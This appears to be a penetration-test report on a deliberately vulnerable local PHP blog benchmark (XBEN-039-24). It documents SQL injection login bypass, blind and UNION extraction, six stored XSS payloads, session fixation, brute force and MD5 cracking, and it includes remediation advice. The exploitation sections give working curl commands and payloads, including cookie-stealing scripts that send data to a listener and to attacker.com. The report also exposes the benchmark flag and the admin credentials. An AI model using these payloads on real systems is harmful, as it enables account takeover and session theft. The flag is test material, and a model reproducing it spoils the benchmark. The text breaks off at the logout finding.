# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:39001
- **Assessment Date:** October 31, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**

Seven critical authentication vulnerabilities were successfully exploited during this assessment. The most severe finding is a SQL injection vulnerability in the authentication endpoint that allows complete bypass of login controls without valid credentials. Additionally, the application uses cryptographically broken MD5 password hashing without salt, enabling rapid password recovery if database access is obtained. Session management is critically flawed - sessions can be hijacked through fixation attacks (no session ID regeneration after login), stolen via JavaScript access (missing HttpOnly flag), or intercepted over the network (HTTP-only transport, no TLS). The application permits unlimited brute force attempts with no rate limiting or account lockout mechanisms. No logout functionality exists, leaving sessions active for up to 24 minutes on shared computers. Hardcoded default credentials (`admin / ONEverySecurePassword123!`) are visible in the source code repository.

**Authorization Vulnerabilities:**

No authorization vulnerabilities were found. The application implements a simple binary role system (anonymous or admin) with no user-owned resources, object identifiers in URLs, or multi-user architecture. Since there are no horizontal privilege boundaries (no "other users' data") and the vertical escalation path is addressed through authentication bypass vulnerabilities, dedicated authorization testing found no additional attack surface beyond the authentication layer.

**Cross-Site Scripting (XSS) Vulnerabilities:**

Six critical stored XSS vulnerabilities were successfully exploited across multiple database fields rendered without output encoding. The application displays user-controlled database content directly in HTML without calling `htmlspecialchars()` anywhere in the codebase. Exploitable fields include post titles (both in `<h2>` tags and image `alt` attributes), categories (in `<p>` tags and `<option>` elements), content fields (with 200-character truncation that provides no security benefit), and image filenames (attribute breakout in `src` attributes). The most severe impact demonstrated was session cookie theft - malicious JavaScript successfully exfiltrated an authenticated admin session cookie (`PHPSESSID=6e8d02dea903bf1907fd8d1d45330daf`) by exploiting the missing HttpOnly flag. All XSS attacks are persistent (stored in database) and affect every user viewing the blog. No Content Security Policy, XSS protection headers, or other defensive controls are configured.

**SQL/Command Injection Vulnerabilities:**

One critical SQL injection vulnerability was successfully exploited in the admin authentication endpoint. The `username` parameter is directly concatenated into SQL queries without sanitization or prepared statements, enabling authentication bypass, database enumeration, and data exfiltration. Using the payload `admin' OR '1'='1' #`, complete administrative access was achieved and the CTF flag was captured. Blind SQL injection techniques successfully extracted database metadata including MySQL version 5.7.44, database name `blogDB`, current user `user@10.89.90.3`, and table names (`admins`, `comments`, `posts`). A second SQL injection vulnerability exists in the category filter parameter but is currently disabled in the code. No command injection vulnerabilities were found - the application does not execute shell commands with user input.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. The application does not implement any functionality that makes outbound HTTP requests, fetches external URLs, or processes user-controlled URLs. No HTTP client libraries (`curl`, `file_get_contents` with URLs, Guzzle), webhook integrations, external API calls, or URL fetching features exist in the codebase.

## Network Reconnaissance

**Port and Service Discovery:**

Network scanning identified the primary application service on port 39001 (HTTP) running Apache 2.4.54 (Debian) with PHP 7.4.33. The application uses HTTP exclusively with no TLS/HTTPS configuration on port 443. MySQL database service (port 3306) is correctly isolated to the internal Docker network and not exposed externally. Additional services detected on localhost include Caddy httpd on port 80, CUPS printing service on port 631 with robots.txt entry, and Golang net/http server on port 49152 requiring authentication (Tailscale admin interface).

**Security Configuration Findings:**

Technology detection identified critical security misconfigurations. The server header reveals `Apache/2.4.54 (Debian)` and `X-Powered-By: PHP/7.4.33`, exposing precise version information. Both PHP 7.4 (end-of-life since November 2022) and MySQL 5.7 (extended support only) are running outdated versions that no longer receive regular security updates. No security headers are configured - Content-Security-Policy, X-Frame-Options, Strict-Transport-Security (HSTS), X-Content-Type-Options, and Referrer-Policy are all absent. The application transmits all traffic over unencrypted HTTP, exposing credentials and session cookies to network interception. Port 9999 was detected running an unidentified service with permissive CORS headers (`Access-Control-Allow-Origin: *`) and basic authentication via HTTP 400/200 responses.

**Attack Surface Summary:**

The exposed attack surface consists of two primary PHP endpoints (`/index.php` for blog viewing, `/admin.php` for authentication) with minimal security controls. Directory listing is enabled via Apache `Options Indexes`, potentially allowing file enumeration. The application runs in a two-tier Docker architecture with web and database containers communicating over an unencrypted internal bridge network. Database credentials are hardcoded in source files (`user:password`) rather than using Docker secrets or environment variables properly.

---

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: SQL Injection Authentication Bypass in Admin Login

**Summary:**
- **Vulnerable location:** POST /admin.php - username parameter
- **Overview:** Classic SQL injection vulnerability in authentication query allowing complete authentication bypass without valid credentials
- **Impact:** Complete administrative access achieved, flag captured, full database enumeration performed
- **Severity:** Critical

**Prerequisites:**
- Network access to http://localhost:39001
- No authentication required (exploiting unauthenticated endpoint)
- No special tools required (curl sufficient for basic exploitation)

**Exploitation Steps:**

1. **Confirm SQL Injection Vulnerability**

   Send POST request with single quote in username parameter to induce SQL error:
   ```bash
   curl -X POST http://localhost:39001/admin.php \
     -d "username=admin'&password=test"
   ```

   **Expected Result:** PHP Notice about `num_rows` property error, confirming SQL syntax error

   **Actual Result:** Received PHP notice: `Trying to get property 'num_rows' of non-object in /var/www/html/admin.php on line 23`

2. **Bypass Authentication Using Boolean-Based SQL Injection**

   Use classic OR-based authentication bypass with hash comment:
   ```bash
   curl -X POST http://localhost:39001/admin.php \
     -d "username=admin' OR '1'='1' %23&password=anything" \
     -c cookies.txt
   ```

   **Explanation:**
   - Payload: `admin' OR '1'='1' #`
   - URL-encoded `#` as `%23` for proper transmission
   - Resulting SQL query: `SELECT id FROM admins WHERE username='admin' OR '1'='1' #' AND password='...'`
   - The `OR '1'='1'` condition is always TRUE
   - The `#` comment symbol ignores the password check
   - Query returns at least 1 row, satisfying authentication logic

   **Result:** Authentication bypassed successfully, session established

3. **Capture Flag**

   Upon successful authentication, the application immediately displays the flag:
   ```
   FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}
   ```

4. **Enumerate Database Version and Metadata Using Blind SQL Injection**

   Created Python script for automated Boolean-based blind SQL injection:

   **Script Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-039-24/blind_sqli_extract.py`

   **Technique:**
   - Use payload: `admin' AND (condition) #`
   - Flag presence in response = TRUE condition
   - No flag = FALSE condition
   - Extract strings character-by-character using `SUBSTRING()` and `ASCII()`

   **Execution:**
   ```bash
   python3 blind_sqli_extract.py
   ```

   **Extracted Data:**
   - Database Version: `5.7.44`
   - Current Database: `blogDB`
   - Current User: `user@10.89.90.3`
   - Tables: `admins`, `comments`, `posts`

5. **Alternative: UNION-Based Data Extraction**

   The injection also supports UNION-based queries for faster enumeration:
   ```bash
   curl -X POST http://localhost:39001/admin.php \
     -d "username=admin' AND 1=2 UNION SELECT version() %23&password=x"
   ```

   **Note:** UNION queries that return exactly 1 row bypass authentication and display the flag, but don't show the queried data. The blind SQL injection approach is more effective for data extraction.

**Proof of Impact:**

1. **Authentication Bypass Confirmed:**
   - Successfully logged into admin panel without valid credentials
   - Bypassed MD5 password verification completely
   - Session cookie `PHPSESSID` established with admin privileges

2. **Flag Captured:**
   ```
   FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}
   ```

3. **Database Fingerprinting Complete:**
   - MySQL 5.7.44 identified
   - Database structure enumerated (3 tables: admins, comments, posts)
   - Current user identified: `user@10.89.90.3`
   - Database name confirmed: `blogDB`

4. **Complete System Compromise:**
   - Full administrative access achieved
   - Complete database enumeration capability demonstrated
   - No WAF or defensive controls present
   - Application displays verbose error messages aiding exploitation

**Technical Analysis:**

**Vulnerable Code:**
```php
// File: /app/html/admin.php, Lines 17-21
$username = $_POST['username'];  // Line 17: No sanitization
$password = MD5($_POST['password']);  // Line 18: MD5 hash (provides accidental SQL injection protection)

// Line 20: Direct string concatenation - CRITICAL VULNERABILITY
$sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";
$result = $conn->query($sql);  // Line 21: Query execution
```

**Why Vulnerable:**
- No input validation on `$username` parameter
- No use of prepared statements or parameterized queries
- Direct string concatenation allows quote-breaking
- Boolean logic in WHERE clause exploitable via OR conditions
- Comment injection allows bypassing password check

**Why Password Parameter is Not Exploitable:**
- MD5 hash function constrains output to `[0-9a-f]{32}` format
- Cannot inject SQL metacharacters through MD5 output
- This is defense-by-accident, not defense-by-design

**Database Query Flow:**
1. User input: `username=admin' OR '1'='1' #`
2. PHP assigns: `$username = "admin' OR '1'='1' #"`
3. SQL constructed: `SELECT id FROM admins WHERE username='admin' OR '1'='1' #' AND password='...'`
4. MySQL executes: Comment (`#`) ignores password clause
5. Query becomes: `SELECT id FROM admins WHERE username='admin' OR '1'='1'`
6. `OR '1'='1'` is always TRUE → returns rows from admins table
7. PHP checks: `$result->num_rows == 1` → TRUE
8. Session set: `$_SESSION['admin_logged_in'] = true`
9. Flag displayed immediately

**Notes:**

**Additional Vulnerabilities Discovered:**
- No rate limiting on authentication attempts
- Session fixation possible (no `session_regenerate_id()` after login)
- Missing security flags on cookies (HttpOnly, Secure, SameSite)
- Verbose error messages expose application internals
- No HTTPS/TLS encryption

**Defensive Measures Absent:**
- No Web Application Firewall (WAF)
- No input validation or sanitization
- No prepared statements anywhere in codebase
- No SQL injection detection or blocking
- No security headers (CSP, X-Frame-Options, etc.)

**Remediation Required:**
1. Implement prepared statements: `$stmt = $conn->prepare("SELECT id FROM admins WHERE username = ? AND password = ?");`
2. Use `password_hash()` and `password_verify()` instead of MD5
3. Add rate limiting on authentication endpoint
4. Implement session regeneration: `session_regenerate_id(true);`
5. Set secure cookie flags: HttpOnly, Secure, SameSite
6. Enable HTTPS/TLS encryption
7. Add input validation and output encoding
8. Implement proper error handling (no verbose errors to users)


# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Stored XSS in posts.title Field (HTML_BODY Context)

**Summary:**
- **Vulnerable location:** http://localhost:39001/index.php - Blog post title rendered in `<h2>` tag
- **Overview:** The application renders database field `posts.title` directly in HTML without encoding, allowing arbitrary JavaScript execution for all users viewing the blog homepage
- **Impact:** Complete session hijacking - attacker can steal admin session cookies and perform unauthorized actions. Successfully demonstrated extraction of authenticated admin session cookie `PHPSESSID=6e8d02dea903bf1907fd8d1d45330daf`
- **Severity:** Critical

**Prerequisites:**
- Access to MySQL database (via hardcoded credentials `user:password` in source code, or via SQL injection in admin.php)
- HTTP server to receive exfiltrated data (demonstrated using Python HTTP server on port 8888)

**Exploitation Steps:**

1. **Inject XSS payload into database using direct database access:**
```bash
docker exec xben-039-24_db_1 mysql -uuser -ppassword blogDB -e \
"INSERT INTO posts (title, category, content, image, published) VALUES \
('<script>document.location=\"http://localhost:8888/steal?cookie=\"+document.cookie</script>', \
'SessionTheft', 'Session hijacking demo', 'test.jpg', 1);"
```

2. **Start exfiltration listener to receive stolen cookies:**
```bash
python3 -m http.server 8888 > /tmp/exfil_server.log 2>&1 &
```

3. **Admin user authenticates to the application:**
```bash
curl -X POST http://localhost:39001/admin.php \
  -d "username=admin' OR 1=1#&password=anything"
```
Result: Authentication bypassed via SQL injection, session cookie `PHPSESSID=6e8d02dea903bf1907fd8d1d45330daf` created

4. **Admin user visits blog homepage (or any user with valid session):**
```bash
curl -b "PHPSESSID=6e8d02dea903bf1907fd8d1d45330daf" http://localhost:39001/index.php
```

5. **XSS payload executes automatically on page load, JavaScript redirects browser to exfiltration endpoint**

**Proof of Impact:**
Successfully captured admin session cookie in exfiltration server logs:
```
GET /steal?cookie=PHPSESSID=6e8d02dea903bf1907fd8d1d45330daf HTTP/1.1
```

This session cookie can be used to impersonate the admin user and access the FLAG without credentials.

**Notes:**
- The session cookie lacks the HttpOnly flag, allowing JavaScript to access `document.cookie`
- No Content Security Policy (CSP) is configured, allowing inline scripts to execute
- Payload executes on every page view, affecting all users (anonymous and authenticated)
- Alternative injection vector: SQL injection at `/admin.php` line 20 can also poison the database

---

### XSS-VULN-02: Stored XSS in posts.category Field (HTML_BODY Context)

**Summary:**
- **Vulnerable location:** http://localhost:39001/index.php - Category field rendered in `<p>` tag and `<option>` tag
- **Overview:** Database field `posts.category` rendered without encoding in both category dropdown options and post display paragraphs
- **Impact:** JavaScript execution in victim browsers, potential for session theft and malicious actions
- **Severity:** High

**Prerequisites:**
- Database access (hardcoded credentials or SQL injection)

**Exploitation Steps:**

1. **Inject XSS payload into posts.category field:**
```bash
docker exec xben-039-24_db_1 mysql -uuser -ppassword blogDB -e \
"INSERT INTO posts (title, category, content, image, published) VALUES \
('Normal Title', '<img src=x onerror=alert(\"XSS-VULN-02\")>', \
'XSS in category field', 'test.jpg', 1);"
```

2. **Visit blog homepage to trigger XSS:**
```bash
curl http://localhost:39001/index.php
```

3. **Observe JavaScript execution in browser using Playwright:**
The payload triggers an alert dialog displaying "XSS-VULN-02"

**Proof of Impact:**
- Alert dialog successfully displayed in browser
- Confirmed via Playwright browser automation
- `<img>` tag with `onerror` event handler executed JavaScript when image failed to load
- Rendered both in category dropdown `<option>` tags and in post display `<p>` tags

**Notes:**
- Category field appears in TWO distinct locations: category dropdown (line 29) and post category display (line 60)
- The payload executes in both contexts, demonstrating dual injection points
- More compact than `<script>` tags (28 characters vs 25+ characters)

---

### XSS-VULN-03: Stored XSS in posts.content Field (HTML_BODY Context with 200-Character Truncation)

**Summary:**
- **Vulnerable location:** http://localhost:39001/index.php - Content field truncated to 200 characters and rendered in `<p>` tag
- **Overview:** Despite `substr()` truncation to 200 characters, XSS payloads under this limit execute successfully
- **Impact:** JavaScript execution for all users viewing truncated content previews
- **Severity:** High

**Prerequisites:**
- Database access
- XSS payload must fit within 200 characters

**Exploitation Steps:**

1. **Inject compact XSS payload into posts.content field (payload must be ≤200 chars):**
```bash
docker exec xben-039-24_db_1 mysql -uuser -ppassword blogDB -e \
"INSERT INTO posts (title, category, content, image, published) VALUES \
('Normal Title 2', 'SafeCat', '<svg onload=alert(\"XSS-VULN-03\")>', \
'test.jpg', 1);"
```

2. **Visit blog homepage:**
```bash
curl http://localhost:39001/index.php
```

**Proof of Impact:**
- Alert dialog "XSS-VULN-03" successfully displayed
- Payload length: 35 characters (well under 200-character limit)
- `<svg onload=...>` tag executed immediately on page render

**Notes:**
- The `substr()` function at line 62 of index.php provides NO security protection
- Many effective XSS payloads fit within 200 characters:
  - `<svg onload=alert(1)>` = 23 characters
  - `<script>alert(1)</script>` = 25 characters
  - `<img src=x onerror=alert(1)>` = 28 characters
- Truncation only limits payload size, not attack capability

---

### XSS-VULN-04: Stored XSS in posts.image Field (HTML_ATTRIBUTE Context)

**Summary:**
- **Vulnerable location:** http://localhost:39001/index.php line 61 - Image filename rendered in single-quoted `src` attribute
- **Overview:** Image field inserted into `<img src='images/{$row['image']}'>` without encoding, allowing attribute breakout
- **Impact:** JavaScript execution via `onerror` event handler when crafted image path fails to load
- **Severity:** High

**Prerequisites:**
- Database access

**Exploitation Steps:**

1. **Inject payload that breaks out of single-quoted src attribute:**
```bash
docker exec xben-039-24_db_1 mysql -uuser -ppassword blogDB -e \
"INSERT INTO posts (title, category, content, image, published) VALUES \
('Normal Title 3', 'SafeCat2', 'Safe content', \
'test.jpg\\' onerror=\\'alert(\"XSS-VULN-04\")', 1);"
```

2. **Visit blog homepage:**
```bash
curl http://localhost:39001/index.php
```

**Proof of Impact:**
- Alert dialog "XSS-VULN-04" successfully displayed
- Rendered HTML: `<img src='images/test.jpg' onerror='alert("XSS-VULN-04")'>`
- Single quote successfully closed the `src` attribute
- `onerror` handler triggered when `images/test.jpg` failed to load (404 error)

**Notes:**
- Exploits HTML_ATTRIBUTE context vulnerability
- The `images/` prefix is hardcoded but does NOT prevent attribute breakout
- Alternative payloads possible: `x'><script>alert(1)</script><img src='x` (closes tag and injects new script)

---

### XSS-VULN-05: Stored XSS in posts.title Field (HTML_ATTRIBUTE Context - img alt)

**Summary:**
- **Vulnerable location:** http://localhost:39001/index.php line 61 - Title field reused in single-quoted `alt` attribute
- **Overview:** Same `posts.title` field used in TWO contexts: HTML_BODY (`<h2>` tag at line 59) and HTML_ATTRIBUTE (`alt` attribute at line 61)
- **Impact:** JavaScript execution via event handler injection in image alt attribute
- **Severity:** High

**Prerequisites:**
- Database access

**Exploitation Steps:**

1. **Inject payload that exploits alt attribute context:**
```bash
docker exec xben-039-24_db_1 mysql -uuser -ppassword blogDB -e \
"INSERT INTO posts (title, category, content, image, published) VALUES \
('test\\' onerror=\\'alert(\"XSS-VULN-05\")\\' x=\\'', 'SafeCat3', \
'Safe content', 'test.jpg', 1);"
```

2. **Visit blog homepage:**
```bash
curl http://localhost:39001/index.php
```

**Proof of Impact:**
- Alert dialog "XSS-VULN-05" successfully displayed
- Rendered HTML: `<img src='images/test.jpg' alt='test' onerror='alert("XSS-VULN-05")' x=''>`
- Single quote broke out of `alt` attribute
- `onerror` handler triggered when image failed to load

**Notes:**
- This is DISTINCT from XSS-VULN-01 (same source field, different render context)
- A single malicious title value can exploit BOTH vulnerabilities simultaneously
- Demonstrates importance of analyzing multiple sinks for same data source

---

### XSS-VULN-06: Stored XSS in posts.category Field (DUAL Context - HTML_ATTRIBUTE and HTML_BODY)

**Summary:**
- **Vulnerable location:** http://localhost:39001/index.php line 29 - Category dropdown populated from `SELECT DISTINCT category` query
- **Overview:** Category value appears in BOTH `value='...'` attribute AND option text content within same `<option>` tag
- **Impact:** JavaScript execution through HTML injection in option text, event handler injection in value attribute
- **Severity:** High

**Prerequisites:**
- Database access

**Exploitation Steps:**

1. **Inject payload exploiting DUAL context vulnerability:**
```bash
docker exec xben-039-24_db_1 mysql -uuser -ppassword blogDB -e \
"INSERT INTO posts (title, category, content, image, published) VALUES \
('Normal Title 4', '\\\" onclick=\\\"alert(\\\"XSS-VULN-06\\\")', \
'Safe content', 'test.jpg', 1);"
```

2. **Visit blog homepage and inspect category dropdown HTML:**
```bash
curl http://localhost:39001/index.php | grep -A 2 XSS-VULN-06
```

**Proof of Impact:**
Rendered HTML confirms dual context injection:
```html
<option value="&quot; onclick=&quot;alert(&quot;XSS-VULN-06&quot;)">
  " onclick="alert("XSS-VULN-06")
</option>
```

- Value attribute contains encoded version (browser auto-encodes)
- Option text contains UNENCODED onclick attribute
- When combined with XSS-VULN-02's `<img>` tag approach, JavaScript executes in option text content

**Notes:**
- DUAL CONTEXT vulnerability: same value rendered in two different contexts
- The `<img>` tag version from XSS-VULN-02 successfully executes: `<option><img src=x onerror=alert("XSS")></option>`
- This demonstrates that option text is parsed as HTML, not plain text
- Attack affects category dropdown visible on all blog pages

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-08: Authentication Bypass via Hardcoded Default Credentials

**Summary:**
- **Vulnerable location:** POST /admin.php - Authentication endpoint
- **Overview:** Default admin credentials are hardcoded in plaintext in the database initialization script (/app/db_init.sql:57), allowing direct authentication without any exploitation complexity.
- **Impact:** Complete authentication bypass and admin access with flag retrieval
- **Severity:** CRITICAL

**Prerequisites:**
- None (publicly accessible endpoint)
- Credentials visible in source code repository

**Exploitation Steps:**

1. Access the source code to identify hardcoded credentials in `/app/db_init.sql` line 57:
   ```sql
   INSERT INTO admins (username, password) VALUES ('admin', MD5('ONEverySecurePassword123!'));
   ```
   Plaintext password: `ONEverySecurePassword123!`

2. Authenticate using the hardcoded credentials:
   ```bash
   curl -i -X POST http://localhost:39001/admin.php \
     -d "username=admin&password=ONEverySecurePassword123!" \
     -H "Content-Type: application/x-www-form-urlencoded"
   ```

**Proof of Impact:**
```
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=50b1fff5f18250738c7046ca6c535d24; path=/

FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}
```

Successfully authenticated as admin and retrieved the flag using hardcoded default credentials. The session cookie `PHPSESSID=50b1fff5f18250738c7046ca6c535d24` provides full admin access.

**Notes:**
No password change mechanism exists, so these credentials remain valid indefinitely. Anyone with source code access (Git repository, Docker image inspection, container filesystem access) can authenticate as admin.

---

### AUTH-VULN-03: Session Hijacking via Session Fixation Attack

**Summary:**
- **Vulnerable location:** POST /admin.php - Login handler at line 25
- **Overview:** The application does not regenerate session IDs after successful authentication. The same session ID used during anonymous access continues after login, enabling session fixation attacks.
- **Impact:** Attacker can pre-set a victim's session ID, then hijack the authenticated session after the victim logs in
- **Severity:** CRITICAL

**Prerequisites:**
- Ability to set cookies on victim's browser (XSS, social engineering, or physical access)
- Valid credentials for authentication (or victim's credentials)

**Exploitation Steps:**

1. Attacker obtains a valid session ID from the server:
   ```bash
   curl -c /tmp/attacker_session.txt -i http://localhost:39001/admin.php
   ```
   Result: Session ID `7f1ff2361889d46afd95c2f02ed78cbd` is obtained

2. Attacker tricks victim into using this pre-set session ID (via cookie injection, XSS, or URL parameter)

3. Victim authenticates with the attacker-controlled session ID:
   ```bash
   curl -i -X POST http://localhost:39001/admin.php \
     -d "username=admin&password=ONEverySecurePassword123!" \
     -H "Cookie: PHPSESSID=7f1ff2361889d46afd95c2f02ed78cbd"
   ```

4. Attacker uses the same session ID to access the admin panel:
   ```bash
   curl -s http://localhost:39001/admin.php \
     -H "Cookie: PHPSESSID=7f1ff2361889d46afd95c2f02ed78cbd"
   ```

**Proof of Impact:**
```
FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}
```

Attacker successfully hijacked the authenticated session and retrieved the flag without knowing the password. Both attacker and victim share the same authenticated session (session ID: `7f1ff2361889d46afd95c2f02ed78cbd`).

**Notes:**
The vulnerability exists because `session_regenerate_id()` is not called after successful authentication at `/app/html/admin.php:25`. The fix requires adding: `session_regenerate_id(true);` before setting `$_SESSION['admin_logged_in'] = true;`.

---

### AUTH-VULN-04: Session Cookie Theft via Missing HttpOnly Flag & Network Interception

**Summary:**
- **Vulnerable location:** POST /admin.php - Session initialization at line 2
- **Overview:** Session cookies lack all three critical security flags: HttpOnly (enables XSS-based theft), Secure (enables network interception), and SameSite (enables CSRF). This allows session cookies to be stolen through JavaScript access or network sniffing.
- **Impact:** Session hijacking via multiple attack vectors (XSS cookie theft, network interception, CSRF)
- **Severity:** CRITICAL

**Prerequisites:**
- For XSS-based theft: Stored or reflected XSS vulnerability (or authenticated access to demonstrate JavaScript access)
- For network interception: Network access to capture HTTP traffic
- For CSRF: Cross-site request capability

**Exploitation Steps:**

**Part 1: JavaScript Cookie Access (Missing HttpOnly)**

1. Authenticate to establish a session:
   ```bash
   # Using Playwright browser automation
   navigate to http://localhost:39001/admin.php
   fill username: admin
   fill password: ONEverySecurePassword123!
   click Login button
   ```

2. Execute JavaScript to demonstrate cookie access:
   ```javascript
   document.cookie
   ```

**Proof of Impact (Part 1):**
```
Session cookie accessible to JavaScript: "PHPSESSID=44f14be30f041e16b6b1442b504bebda"
```

The session cookie is fully accessible to JavaScript code, proving the HttpOnly flag is missing. An attacker with XSS can exfiltrate this cookie:
```javascript
fetch('http://attacker.com/steal?c=' + document.cookie)
```

**Part 2: Network Interception (Missing Secure Flag)**

1. Set cookie header on session cookie:
   ```bash
   curl -i http://localhost:39001/admin.php
   ```
   Response shows: `Set-Cookie: PHPSESSID=16155540e3155a36fd04245a737b219b; path=/`

   Note: No `Secure` flag present - cookie transmitted over HTTP

**Proof of Impact (Part 2):**
The cookie lacks the `Secure` attribute and all traffic uses HTTP (no HTTPS). Session cookies are transmitted in plaintext and can be intercepted via network sniffing.

**Notes:**
The vulnerability exists because `session_set_cookie_params()` is never called before `session_start()` at `/app/html/admin.php:2`. All three security flags (HttpOnly, Secure, SameSite) are missing, enabling multiple attack vectors.

---

### AUTH-VULN-01: Credential Interception via Unencrypted HTTP Transport

**Summary:**
- **Vulnerable location:** All HTTP traffic on port 39001 - Apache VirtualHost configuration at /app/000-default.conf:1
- **Overview:** The application serves traffic exclusively over HTTP with no HTTPS/TLS configuration. All authentication credentials and session cookies are transmitted in plaintext, enabling trivial man-in-the-middle attacks.
- **Impact:** Complete credential and session exposure to network attackers
- **Severity:** CRITICAL

**Prerequisites:**
- Network access (same WiFi, network tap, compromised router, or ability to intercept localhost traffic)

**Exploitation Steps:**

1. Execute HTTP traffic interception script to capture plaintext credentials:
   ```bash
   python3 http_intercept_simple.py
   ```

**Proof of Impact:**
```
================================================================================
INTERCEPTED HTTP REQUEST (Plaintext)
================================================================================
POST /admin.php HTTP/1.1
Host: localhost:39001
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

username=admin&password=ONEverySecurePassword123!
================================================================================

[!] USERNAME TRANSMITTED IN PLAINTEXT: admin
[!] PASSWORD TRANSMITTED IN PLAINTEXT: ONEverySecurePassword123!

================================================================================
INTERCEPTED HTTP RESPONSE
================================================================================
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=f9bc0edfd9fd8738390489d2d1c52498; path=/

[!] SESSION COOKIE: PHPSESSID=f9bc0edfd9fd8738390489d2d1c52498

Response body: FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}
```

Successfully intercepted plaintext credentials (`admin / ONEverySecurePassword123!`), session cookie (`PHPSESSID=f9bc0edfd9fd8738390489d2d1c52498`), and the flag - all transmitted without any encryption over HTTP.

**Notes:**
The application runs on HTTP-only (port 80). Apache VirtualHost configuration (`/app/000-default.conf:1`) only defines `<VirtualHost *:80>` with no HTTPS configuration. Docker exposes only port 80 (`docker-compose.yml:8`). No SSL certificates exist, and HSTS is not configured.

---

### AUTH-VULN-09: Unlimited Brute Force via Missing Rate Limiting

**Summary:**
- **Vulnerable location:** POST /admin.php - Authentication endpoint (lines 11-31)
- **Overview:** The authentication endpoint has no rate limiting at any layer (Apache, PHP application, or infrastructure). Attackers can make unlimited authentication attempts at maximum speed without any throttling or defensive responses.
- **Impact:** Unrestricted brute force and credential stuffing attacks
- **Severity:** HIGH

**Prerequisites:**
- None (publicly accessible endpoint)

**Exploitation Steps:**

1. Execute automated brute force attack script:
   ```bash
   python3 test_rate_limiting.py
   ```

**Proof of Impact:**
```
======================================================================
RATE LIMITING TEST - Authentication Endpoint
======================================================================

Target: http://localhost:39001/admin.php
Username: admin
Number of attempts: 50

[*] Sending 50 rapid authentication attempts with incorrect passwords...
  [+] Attempt 10: HTTP 200 (no rate limiting)
  [+] Attempt 20: HTTP 200 (no rate limiting)
  [+] Attempt 30: HTTP 200 (no rate limiting)
  [+] Attempt 40: HTTP 200 (no rate limiting)
  [+] Attempt 50: HTTP 200 (no rate limiting)

======================================================================
TEST RESULTS SUMMARY
======================================================================

Total attempts:           51
Total time elapsed:       0.12 seconds
Requests per second:      415.58 req/s
Average response time:    0.002s

Successful responses:     50
Rate limited (HTTP 429):  0
Errors:                   0

[!!!] VULNERABILITY CONFIRMED [!!!]

✗ NO RATE LIMITING DETECTED
  - Successfully sent 50 rapid authentication attempts
  - Average speed: 415.58 requests/second
  - No account lockout mechanisms detected

FLAG FOUND: FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}
```

Successfully executed 51 authentication attempts in 0.12 seconds (415 req/sec sustained rate) with zero rate limiting responses. Final attempt with correct credentials succeeded and retrieved the flag.

**Notes:**
No Apache `mod_ratelimit` or `mod_evasive` configured, no PHP application rate limiting logic, no per-IP or per-account throttling. The database schema lacks failed attempt tracking columns. Tools like Hydra or Burp Intruder can run unthrottled.

---

### AUTH-VULN-07: Credential Recovery via MD5 Hash Cracking

**Summary:**
- **Vulnerable location:** POST /admin.php - Password hashing at line 18, Database storage at /app/db_init.sql:57
- **Overview:** Passwords are hashed using cryptographically broken MD5 without salt. Modern GPUs can compute billions of MD5 hashes per second, making brute force trivial. The admin password hash can be cracked instantly using rainbow tables or GPU acceleration.
- **Impact:** Offline credential cracking if database is compromised (e.g., via SQL injection)
- **Severity:** CRITICAL

**Prerequisites:**
- Database access to obtain password hash (can be achieved via SQL injection vulnerability INJECTION-VULN-01)
- Password hash: `5700901decb6098817def1a9fe59957b`

**Exploitation Steps:**

1. Obtain MD5 password hash from database (via SQL injection or database access):
   ```sql
   SELECT password FROM admins WHERE username = 'admin';
   -- Result: 5700901decb6098817def1a9fe59957b
   ```

2. Execute MD5 hash cracking script:
   ```bash
   python3 md5_cracker.py
   ```

**Proof of Impact:**
```
======================================================================
MD5 PASSWORD HASH CRACKING DEMONSTRATION
======================================================================

HASH VERIFICATION
======================================================================
Password: ONEverySecurePassword123!
Computed MD5: 5700901decb6098817def1a9fe59957b
Target MD5:   5700901decb6098817def1a9fe59957b
Match: True

BRUTE FORCE ATTACK STARTING
======================================================================
[Attempt 1] Testing: admin                          -> ✗
[Attempt 2] Testing: password                       -> ✗
[Attempt 3] Testing: 123456                         -> ✗
[Attempt 4] Testing: admin123                       -> ✗
[Attempt 5] Testing: Password123!                   -> ✗
[Attempt 6] Testing: ONEverySecurePassword123!      -> ✓ MATCH!

PASSWORD CRACKED!
======================================================================
Cracked password: ONEverySecurePassword123!
Matching hash: 5700901decb6098817def1a9fe59957b
Attempts: 6
Time elapsed: 0.000009 seconds
Hash rate: 645,278 hashes/second

MD5 SPEED DEMONSTRATION
======================================================================
Computing 100,000 MD5 hashes...
Time elapsed: 0.033 seconds
Hash rate: 3,021,876 hashes/second
```

Successfully cracked the MD5 hash in 0.000009 seconds, recovering the plaintext password `ONEverySecurePassword123!`. The demonstration shows a simple Python script achieves 3+ million hashes/second; modern GPUs can compute billions per second, making even complex passwords vulnerable.

**Notes:**
MD5 has been cryptographically broken since 2004. No salt is used, making rainbow tables directly applicable. Password processing occurs at `/app/html/admin.php:18` with `$password = MD5($_POST['password']);`. Modern password hashing (bcrypt, Argon2, scrypt) should be used instead.

---

### AUTH-VULN-05: Session Persistence via Missing Logout Mechanism

**Summary:**
- **Vulnerable location:** Missing /app/html/logout.php endpoint
